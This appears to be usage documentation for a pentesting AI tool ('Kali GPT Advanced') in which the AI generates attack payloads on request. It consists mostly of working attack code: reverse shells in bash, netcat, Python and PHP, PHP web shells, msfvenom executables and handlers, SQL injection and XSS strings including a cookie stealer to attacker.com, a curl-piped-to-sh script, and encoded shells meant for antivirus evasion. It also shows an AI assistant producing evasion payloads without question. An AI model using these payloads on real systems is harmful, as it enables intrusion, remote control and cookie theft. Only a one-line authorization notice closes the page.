# Payload Generation Examples

Common scenarios for generating payloads with Kali GPT Advanced.

## Example 1: Reverse Shell Payloads

**Scenario:** Need reverse shell for compromised Linux server

### Steps:
1. Launch Kali GPT Advanced
2. Select **Payload Generator** (Option 6)
3. Enter details:
   - Payload type: `reverse shell`
   - LHOST: `10.10.14.5`
   - LPORT: `4444`

### AI Provides Multiple Formats:

```bash
# Bash reverse shell
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Netcat reverse shell
nc -e /bin/bash 10.10.14.5 4444

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'

# PHP reverse shell
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# Listener command
nc -lvnp 4444
```

---

## Example 2: Web Shells

**Scenario:** Upload capability found on web server

### Ask AI:
```
"Generate PHP web shells for upload"
```

### AI Provides:

```php
<!-- Simple PHP web shell -->
<?php system($_GET['cmd']); ?>

<!-- Advanced web shell with obfuscation -->
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<!-- Usage -->
http://target.com/shell.php?cmd=whoami
```

---

## Example 3: SQL Injection Payloads

**Scenario:** Testing for SQL injection

### Ask AI:
```
"Generate SQL injection test payloads for MySQL"
```

### AI Provides:

```sql
-- Basic tests
' OR '1'='1
' OR 1=1--
' OR 'a'='a
admin'--

-- Union-based
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3,4,5--

-- Time-based blind
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

-- Error-based
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
```

---

## Example 4: Cross-Site Scripting (XSS)

**Scenario:** Testing for XSS vulnerabilities

### Ask AI:
```
"Generate XSS payloads for testing web forms"
```

### AI Provides:

```javascript
// Basic XSS
<script>alert('XSS')</script>

// Image-based
<img src=x onerror=alert('XSS')>

// Event handler
<body onload=alert('XSS')>

// Obfuscated
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>

// Bypass filters
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert`XSS`</script>

// Cookie stealer
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>
```

---

## Example 5: msfvenom Payloads

**Scenario:** Generate Metasploit payloads

### Ask AI:
```
"Generate msfvenom reverse shell payloads for Windows"
```

### AI Provides:

```bash
# Windows executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# Windows DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o shell.dll

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# JSP web shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.jsp

# ASP web shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp

# Handler setup
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; exploit"
```

---

## Example 6: Privilege Escalation Scripts

**Scenario:** Enumeration scripts for privilege escalation

### Ask AI:
```
"Provide Linux privilege escalation enumeration commands"
```

### AI Provides:

```bash
# LinPEAS (download and run)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual enumeration
# SUID binaries
find / -perm -4000 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Sudo permissions
sudo -l

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Services running as root
ps aux | grep root
```

---

## Example 7: Password Attack Wordlists

**Scenario:** Generate custom wordlists

### Ask AI:
```
"Create a wordlist for password cracking based on company 'TechCorp'"
```

### AI Suggests:

```bash
# Use CeWL to create wordlist from company website
cewl -d 2 -m 5 -w techcorp_wordlist.txt https://techcorp.com

# Combine with rules
john --wordlist=techcorp_wordlist.txt --rules --stdout > techcorp_mutated.txt

# Add common patterns
# AI provides mutations like:
TechCorp2024
TechCorp!
TechCorp123
techcorp2024
Techcorp!123
```

---

## Example 8: Encoded Payloads

**Scenario:** Bypass filters with encoding

### Ask AI:
```
"Encode reverse shell payload for AV evasion"
```

### AI Provides:

```bash
# Base64 encoded bash
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' | base64
# Execute: echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ==' | base64 -d | bash

# URL encoded
%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%35%2f%34%34%34%34%20%30%3e%26%31

# Hex encoded PowerShell
# AI provides full PowerShell reverse shell in hex
```

---

## Tips for Payload Generation

1. **Always customize**: Replace IP addresses and ports with your actual values
2. **Test safely**: Test payloads in isolated environments first
3. **Encode when needed**: Use encoding to bypass filters
4. **Multiple formats**: Try different payload types if one doesn't work
5. **Set up listeners**: Always have listener ready before payload execution

---

## Common Payload Types Supported

- Reverse shells (bash, python, nc, php, etc.)
- Web shells (PHP, ASP, JSP)
- Bind shells
- msfvenom payloads
- SQL injection
- XSS payloads
- Command injection
- LDAP injection
- XXE payloads
- Encoded/obfuscated variants

---

**Security Notice:** Use payload generation only for authorized penetration testing, CTF competitions, or educational purposes in isolated lab environments.
